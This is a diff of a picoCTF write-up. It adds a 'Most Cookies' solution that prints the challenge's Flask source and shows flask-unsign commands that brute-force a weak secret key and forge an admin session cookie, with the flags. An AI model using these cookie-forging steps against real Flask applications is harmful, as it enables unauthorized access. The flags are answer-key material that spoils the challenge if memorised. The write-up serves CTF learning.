@@ -239,7 +239,7 @@ After changing the header related to the browser, This is what I see. After look
 
 **Stage 3:**
 
-![](../.gitbook/assets/image%20%286%29.png)
+![](../.gitbook/assets/image%20%287%29.png)
 
 After passing the previous stage, Now I see this. It is asking us to visit it from 2018. I know that there is a header for **"Date"**, so I changed it to a date back in 2018.
 
@@ -262,7 +262,7 @@ This time, We need to access this from Sweden, My first instinct was VPN but so 
 
 **Stage 6:**
 
-![](../.gitbook/assets/image%20%288%29.png)
+![](../.gitbook/assets/image%20%2810%29.png)
 
 This is an easy one, I need to change the `Accept-Language` header, I set it to `sv-en` 
 
@@ -270,7 +270,7 @@ This is an easy one, I need to change the `Accept-Language` header, I set it to 
 
 **Result:**
 
-![](../.gitbook/assets/image%20%287%29.png)
+![](../.gitbook/assets/image%20%289%29.png)
 
 Finally, we have our flag!
 
@@ -452,4 +452,109 @@ Now let's go to `authentication.php` where the `access_log` class exists.
 There you go!
 
 **Flag:** picoCTF{th15\_vu1n\_1s\_5up3r\_53r1ous\_y4ll\_66832978}
+
+### Most Cookies
+
+**Description:** Alright, enough of using my own encryption. Flask session cookies should be plenty secure! 
+
+**Points:** 150
+
+#### **Solution**
+
+This is a similar problem to the first two "Cookie" problems. You'll need set the right cookie to get the flag. This time we are provided with a source code file. Let's have a look
+
+```python
+from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
+import random
+app = Flask(__name__)
+flag_value = open("./flag").read().rstrip()
+title = "Most Cookies"
+cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
+app.secret_key = random.choice(cookie_names)
+
+@app.route("/")
+def main():
+	if session.get("very_auth"):
+		check = session["very_auth"]
+		if check == "blank":
+			return render_template("index.html", title=title)
+		else:
+			return make_response(redirect("/display"))
+	else:
+		resp = make_response(redirect("/"))
+		session["very_auth"] = "blank"
+		return resp
+
+@app.route("/search", methods=["GET", "POST"])
+def search():
+	if "name" in request.form and request.form["name"] in cookie_names:
+		resp = make_response(redirect("/display"))
+		session["very_auth"] = request.form["name"]
+		return resp
+	else:
+		message = "That doesn't appear to be a valid cookie."
+		category = "danger"
+		flash(message, category)
+		resp = make_response(redirect("/"))
+		session["very_auth"] = "blank"
+		return resp
+
+@app.route("/reset")
+def reset():
+	resp = make_response(redirect("/"))
+	session.pop("very_auth", None)
+	return resp
+
+@app.route("/display", methods=["GET"])
+def flag():
+	if session.get("very_auth"):
+		check = session["very_auth"]
+		if check == "admin":
+			resp = make_response(render_template("flag.html", value=flag_value, title=title))
+			return resp
+		flash("That is a cookie! Not very special though...", "success")
+		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
+	else:
+		resp = make_response(redirect("/"))
+		session["very_auth"] = "blank"
+		return resp
+
+if __name__ == "__main__":
+	app.run()
+
+
+```
+
+You can see the `flag()` function for display endpoit. It reads the `very_auth` cookie and checks if it is "admin" if yes, then it will show us the flag. Flask cookies use JWT to created a signed token we need to find the secret. From the above source code we can see from line 6 and 7 that the secret is a random word from `cookie_names` list. If we can figure out which one is it then we can create a signed token for `very_auth=admin` 
+
+I found a python library called ****[**flask-unsign**](https://github.com/Paradoxis/Flask-Unsign) ****which has usefull tools to decrypt the cookie and also brute force for the secret. First let us decrypt the cookie `session` set by the server using
+
+```python
+$ flask-unsign --decode --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YG7ogw.sUaN7zHrEh4nQUr7qe7JfcFeynY
+# Output
+# {'very_auth': 'blank'}
+```
+
+We can use this token to brute force for secret from the word list provided using a `flask-unsign` and a text file \(cookies.txt\) consisting for the words from the list `cookie_name` Then we can use the following command to  find the secret from the list.
+
+```python
+$ flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YG7ogw.sUaN7zHrEh4nQUr7qe7JfcFeynY --wordlist cookies.txt
+[*] Session decodes to: {'very_auth': 'blank'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 28 attempts
+'kiss'
+```
+
+`kiss` is our secret, Now I can just use the `flask-unsign` module to create a signed token for `{'very_auth': 'admin'}`
+
+```python
+$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'kiss'
+# eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YG7s5w.Mdj-rfqsZ4fIPLiC27Nc3WQ7mUw
+```
+
+Let's change the cookie value of `session` to our generated token.
+
+![](../.gitbook/assets/image%20%288%29.png)
+
+**Flag:** picoCTF{pwn\_4ll\_th3\_cook1E5\_478da04c}
 
